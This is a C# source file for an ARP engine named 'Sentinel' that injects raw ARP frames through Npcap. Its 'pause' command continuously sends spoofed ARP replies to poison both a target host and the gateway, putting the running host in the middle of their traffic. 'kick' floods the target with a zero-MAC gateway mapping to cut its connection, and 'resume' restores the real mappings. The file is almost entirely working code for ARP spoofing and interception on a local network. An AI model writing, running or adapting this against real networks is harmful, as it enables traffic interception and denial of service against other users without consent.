using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Sentinel
{
    public class ArpEngine
    {
        // --- Native P/Invoke to wpcap.dll ---
        [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        public static extern int pcap_findalldevs(out IntPtr alldevsp, StringBuilder errbuf);

        [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern void pcap_freealldevs(IntPtr alldevs);

        [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        public static extern IntPtr pcap_open_live(string source, int snaplen, int promisc, int to_ms, StringBuilder errbuf);

        [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int pcap_sendpacket(IntPtr p, byte[] buf, int size);

        [DllImport("wpcap.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern void pcap_close(IntPtr p);

        [StructLayout(LayoutKind.Sequential)]
        public struct pcap_if
        {
            public IntPtr next;
            public string name;
            public string description;
            public IntPtr addresses;
            public uint flags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct pcap_addr
        {
            public IntPtr next;
            public IntPtr addr;
            public IntPtr netmask;
            public IntPtr broadaddr;
            public IntPtr dstaddr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct sockaddr_in
        {
            public short sin_family;
            public ushort sin_port;
            public uint sin_addr;
        }

        private static byte[] ParseMac(string mac)
        {
            string clean = mac.Replace(":", "").Replace("-", "").Trim();
            if (clean.Length != 12) throw new ArgumentException("Invalid MAC format: " + mac);
            byte[] bytes = new byte[6];
            for (int i = 0; i < 6; i++)
            {
                bytes[i] = Convert.ToByte(clean.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        private static byte[] BuildArpPacket(byte[] srcMac, byte[] senderIp, byte[] dstMac, byte[] targetIp, ushort opcode)
        {
            // Ethernet Header (14 bytes) + ARP Payload (28 bytes) = 42 bytes (padded to 60 bytes minimum ethernet frame)
            byte[] packet = new byte[60];

            // 1. Ethernet Header
            // Destination MAC (bytes 0-5)
            Array.Copy(dstMac, 0, packet, 0, 6);
            // Source MAC (bytes 6-11)
            Array.Copy(srcMac, 0, packet, 6, 6);
            // EtherType = 0x0806 (ARP) (bytes 12-13)
            packet[12] = 0x08;
            packet[13] = 0x06;

            // 2. ARP Header
            // Hardware type = Ethernet (1)
            packet[14] = 0x00;
            packet[15] = 0x01;
            // Protocol type = IPv4 (0x0800)
            packet[16] = 0x08;
            packet[17] = 0x00;
            // Hardware size = 6
            packet[18] = 0x06;
            // Protocol size = 4
            packet[19] = 0x04;
            // Opcode: 1 = Request, 2 = Reply
            packet[20] = (byte)(opcode >> 8);
            packet[21] = (byte)(opcode & 0xFF);

            // Sender MAC (bytes 22-27)
            Array.Copy(srcMac, 0, packet, 22, 6);
            // Sender IP (bytes 28-31)
            Array.Copy(senderIp, 0, packet, 28, 4);
            // Target MAC (bytes 32-37)
            Array.Copy(dstMac, 0, packet, 32, 6);
            // Target IP (bytes 38-41)
            Array.Copy(targetIp, 0, packet, 38, 4);

            return packet;
        }

        private static string FindAdapterNameForSubnet(string gatewayIp)
        {
            IntPtr alldevs;
            StringBuilder errbuf = new StringBuilder(256);
            if (pcap_findalldevs(out alldevs, errbuf) != 0 || alldevs == IntPtr.Zero)
            {
                return null;
            }

            string matchedName = null;
            string fallbackName = null;
            IntPtr curr = alldevs;

            while (curr != IntPtr.Zero)
            {
                pcap_if dev = (pcap_if)Marshal.PtrToStructure(curr, typeof(pcap_if));
                if (fallbackName == null && dev.name != null)
                {
                    fallbackName = dev.name;
                }

                // Scan addresses
                IntPtr addrPtr = dev.addresses;
                while (addrPtr != IntPtr.Zero)
                {
                    pcap_addr addr = (pcap_addr)Marshal.PtrToStructure(addrPtr, typeof(pcap_addr));
                    if (addr.addr != IntPtr.Zero)
                    {
                        sockaddr_in sin = (sockaddr_in)Marshal.PtrToStructure(addr.addr, typeof(sockaddr_in));
                        if (sin.sin_family == 2) // AF_INET
                        {
                            IPAddress ip = new IPAddress((long)sin.sin_addr & 0xFFFFFFFF);
                            string ipStr = ip.ToString();
                            // Check if in same /24 subnet as gateway
                            string prefix = gatewayIp.Substring(0, gatewayIp.LastIndexOf('.'));
                            if (ipStr.StartsWith(prefix + "."))
                            {
                                matchedName = dev.name;
                                break;
                            }
                        }
                    }
                    addrPtr = addr.next;
                }

                if (matchedName != null) break;
                curr = dev.next;
            }

            pcap_freealldevs(alldevs);
            return matchedName ?? fallbackName;
        }

        public static int Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("{\"error\":\"Usage: SentinelArpEngine <pause|resume|kick|list> [args...]\"}");
                return 1;
            }

            string command = args[0].ToLowerInvariant();

            try
            {
                if (command == "check")
                {
                    StringBuilder err = new StringBuilder(256);
                    IntPtr alldevs;
                    int res = pcap_findalldevs(out alldevs, err);
                    if (res == 0)
                    {
                        if (alldevs != IntPtr.Zero) pcap_freealldevs(alldevs);
                        Console.WriteLine("{\"status\":\"ok\",\"driver\":\"npcap_ready\"}");
                        return 0;
                    }
                    Console.WriteLine("{\"status\":\"error\",\"message\":\"pcap_findalldevs failed\"}");
                    return 2;
                }

                if (command == "list")
                {
                    IntPtr alldevs;
                    StringBuilder err = new StringBuilder(256);
                    if (pcap_findalldevs(out alldevs, err) != 0 || alldevs == IntPtr.Zero)
                    {
                        Console.WriteLine("{\"error\":\"No interfaces or Npcap not available\"}");
                        return 2;
                    }

                    List<string> devList = new List<string>();
                    IntPtr curr = alldevs;
                    while (curr != IntPtr.Zero)
                    {
                        pcap_if dev = (pcap_if)Marshal.PtrToStructure(curr, typeof(pcap_if));
                        devList.Add(string.Format("{{\"name\":\"{0}\",\"description\":\"{1}\"}}", dev.name ?? "", dev.description ?? ""));
                        curr = dev.next;
                    }
                    pcap_freealldevs(alldevs);
                    Console.WriteLine("[" + string.Join(",", devList.ToArray()) + "]");
                    return 0;
                }

                if (command == "pause")
                {
                    // Args: pause <targetIp> <targetMac> <gatewayIp> <gatewayMac> <hostMac> [intervalMs]
                    if (args.Length < 6)
                    {
                        Console.WriteLine("{\"error\":\"Usage: pause <targetIp> <targetMac> <gatewayIp> <gatewayMac> <hostMac> [intervalMs]\"}");
                        return 1;
                    }

                    string targetIpStr = args[1];
                    string targetMacStr = args[2];
                    string gatewayIpStr = args[3];
                    string gatewayMacStr = args[4];
                    string hostMacStr = args[5];
                    int intervalMs = args.Length > 6 ? int.Parse(args[6]) : 1000;

                    byte[] targetIp = IPAddress.Parse(targetIpStr).GetAddressBytes();
                    byte[] targetMac = ParseMac(targetMacStr);
                    byte[] gatewayIp = IPAddress.Parse(gatewayIpStr).GetAddressBytes();
                    byte[] gatewayMac = ParseMac(gatewayMacStr);
                    byte[] hostMac = ParseMac(hostMacStr);

                    string adapterName = FindAdapterNameForSubnet(gatewayIpStr);
                    if (string.IsNullOrEmpty(adapterName))
                    {
                        Console.WriteLine("{\"status\":\"error\",\"message\":\"No suitable network adapter found for gateway subnet\"}");
                        return 3;
                    }

                    StringBuilder errbuf = new StringBuilder(256);
                    IntPtr pcap = pcap_open_live(adapterName, 65536, 1, 100, errbuf);
                    if (pcap == IntPtr.Zero)
                    {
                        Console.WriteLine("{\"status\":\"error\",\"message\":\"Failed to open adapter: " + errbuf.ToString() + "\"}");
                        return 4;
                    }

                    // Tell Target: Gateway IP is at Host MAC (all target traffic diverts to host)
                    byte[] poisonTarget = BuildArpPacket(hostMac, gatewayIp, targetMac, targetIp, 2);
                    // Tell Gateway: Target IP is at Host MAC (all incoming gateway traffic diverts to host)
                    byte[] poisonGateway = BuildArpPacket(hostMac, targetIp, gatewayMac, gatewayIp, 2);

                    Console.WriteLine(string.Format("{{\"status\":\"running\",\"action\":\"pause\",\"targetIp\":\"{0}\",\"adapter\":\"{1}\"}}", targetIpStr, adapterName));

                    int cycle = 0;
                    while (true)
                    {
                        pcap_sendpacket(pcap, poisonTarget, poisonTarget.Length);
                        pcap_sendpacket(pcap, poisonGateway, poisonGateway.Length);
                        cycle++;

                        if (cycle % 10 == 0)
                        {
                            Console.WriteLine(string.Format("{{\"heartbeat\":true,\"action\":\"pause\",\"cycles\":{0},\"target\":\"{1}\"}}", cycle, targetIpStr));
                        }

                        Thread.Sleep(intervalMs);
                    }
                }

                if (command == "resume")
                {
                    // Args: resume <targetIp> <targetMac> <gatewayIp> <gatewayMac>
                    if (args.Length < 5)
                    {
                        Console.WriteLine("{\"error\":\"Usage: resume <targetIp> <targetMac> <gatewayIp> <gatewayMac>\"}");
                        return 1;
                    }

                    string targetIpStr = args[1];
                    string targetMacStr = args[2];
                    string gatewayIpStr = args[3];
                    string gatewayMacStr = args[4];

                    byte[] targetIp = IPAddress.Parse(targetIpStr).GetAddressBytes();
                    byte[] targetMac = ParseMac(targetMacStr);
                    byte[] gatewayIp = IPAddress.Parse(gatewayIpStr).GetAddressBytes();
                    byte[] gatewayMac = ParseMac(gatewayMacStr);

                    string adapterName = FindAdapterNameForSubnet(gatewayIpStr);
                    if (string.IsNullOrEmpty(adapterName))
                    {
                        Console.WriteLine("{\"status\":\"error\",\"message\":\"Adapter not found\"}");
                        return 3;
                    }

                    StringBuilder errbuf = new StringBuilder(256);
                    IntPtr pcap = pcap_open_live(adapterName, 65536, 1, 100, errbuf);
                    if (pcap == IntPtr.Zero)
                    {
                        Console.WriteLine("{\"status\":\"error\",\"message\":\"Failed to open adapter\"}");
                        return 4;
                    }

                    // Restore frames:
                    // Tell Target: Gateway IP is at REAL Gateway MAC
                    byte[] restoreTarget = BuildArpPacket(gatewayMac, gatewayIp, targetMac, targetIp, 2);
                    // Tell Gateway: Target IP is at REAL Target MAC
                    byte[] restoreGateway = BuildArpPacket(targetMac, targetIp, gatewayMac, gatewayIp, 2);

                    for (int i = 0; i < 6; i++)
                    {
                        pcap_sendpacket(pcap, restoreTarget, restoreTarget.Length);
                        pcap_sendpacket(pcap, restoreGateway, restoreGateway.Length);
                        Thread.Sleep(100);
                    }

                    pcap_close(pcap);
                    Console.WriteLine(string.Format("{{\"status\":\"restored\",\"target\":\"{0}\",\"packetsSent\":12}}", targetIpStr));
                    return 0;
                }

                if (command == "kick")
                {
                    // Args: kick <targetIp> <targetMac> <gatewayIp> <gatewayMac>
                    if (args.Length < 5)
                    {
                        Console.WriteLine("{\"error\":\"Usage: kick <targetIp> <targetMac> <gatewayIp> <gatewayMac>\"}");
                        return 1;
                    }

                    string targetIpStr = args[1];
                    string targetMacStr = args[2];
                    string gatewayIpStr = args[3];
                    string gatewayMacStr = args[4];

                    byte[] targetIp = IPAddress.Parse(targetIpStr).GetAddressBytes();
                    byte[] targetMac = ParseMac(targetMacStr);
                    byte[] gatewayIp = IPAddress.Parse(gatewayIpStr).GetAddressBytes();
                    byte[] deadMac = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

                    string adapterName = FindAdapterNameForSubnet(gatewayIpStr);
                    if (string.IsNullOrEmpty(adapterName)) return 3;

                    StringBuilder errbuf = new StringBuilder(256);
                    IntPtr pcap = pcap_open_live(adapterName, 65536, 1, 100, errbuf);
                    if (pcap == IntPtr.Zero) return 4;

                    // Send rapid dead MAC ARP burst to break all sessions
                    byte[] deadPacket = BuildArpPacket(deadMac, gatewayIp, targetMac, targetIp, 2);
                    for (int i = 0; i < 15; i++)
                    {
                        pcap_sendpacket(pcap, deadPacket, deadPacket.Length);
                        Thread.Sleep(50);
                    }

                    pcap_close(pcap);
                    Console.WriteLine(string.Format("{{\"status\":\"kicked\",\"target\":\"{0}\",\"packetsSent\":15}}", targetIpStr));
                    return 0;
                }

                Console.WriteLine("{\"error\":\"Unknown command: " + command + "\"}");
                return 1;
            }
            catch (DllNotFoundException)
            {
                Console.WriteLine("{\"status\":\"error\",\"code\":\"NPCAP_NOT_INSTALLED\",\"message\":\"Npcap packet injection driver (wpcap.dll) is not installed. Required for autonomous Layer 2 SaaS network control.\"}");
                return 10;
            }
            catch (Exception ex)
            {
                Console.WriteLine("{\"status\":\"error\",\"message\":\"" + ex.Message.Replace("\"", "\\\"") + "\"}");
                return 99;
            }
        }
    }
}
